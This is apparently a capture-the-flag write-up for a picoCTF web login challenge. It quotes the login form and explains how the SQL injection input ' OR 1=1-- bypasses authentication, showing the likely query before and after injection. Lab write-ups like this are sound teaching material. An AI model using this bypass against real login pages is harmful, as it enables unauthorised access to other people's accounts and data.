# Description

There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or `http://jupiter.challenges.picoctf.org:33850`. Do you think you can log us in? Try to see if you can login!

# Hints

- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.

# Solution

- The website offered an admin login page:
   ```html
   <form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <div class="controls">
                <input type="password" id="password" name="password" class="form-control">
            </div>
        </div>
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
   ```
- In the menu we will not find any useful information, let's move on to the Support section
   
- We will see small conversations between the admin and the customer, here we will find out they are talking about the SQL Error.

- When we go to the Admin Login, we can try a basic SQL Injection to bypass the portal. Our injection is specifically having the username as ' OR 1=1-- and the password as whatever (`or vice versa`). The SQL query that checks the login is likely something like:
``` java
 SELECT username, password FROM users WHERE username='$username' AND password='$password';
 ```
When we put in our injection, the query becomes:
``` java
SELECT username, password FROM users WHERE username='' OR 1=1--' AND password='';
```
